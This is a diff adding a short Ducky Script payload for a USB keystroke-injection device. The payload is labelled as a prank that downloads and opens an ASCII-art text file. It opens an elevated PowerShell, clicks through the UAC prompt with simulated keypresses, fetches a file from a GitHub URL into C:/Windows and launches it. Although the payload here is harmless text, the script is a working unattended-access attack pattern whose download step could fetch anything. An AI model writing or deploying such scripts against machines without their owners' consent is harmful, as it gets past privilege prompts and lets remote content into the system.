@@ -1,0 +1,18 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Downloads the Txt file and opens it.
+REM Version:	1.0
+REM Category:	DownloadAscii
+DELAY 1000
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 560
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 700
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/UNC0V3R3D/ressources/main/trollfaceDANCE.txt -OutFile C:/Windows/6565.txt; Start-Process -FilePath "C:/windows/6565.txt" -WindowStyle maximized
+ENTER
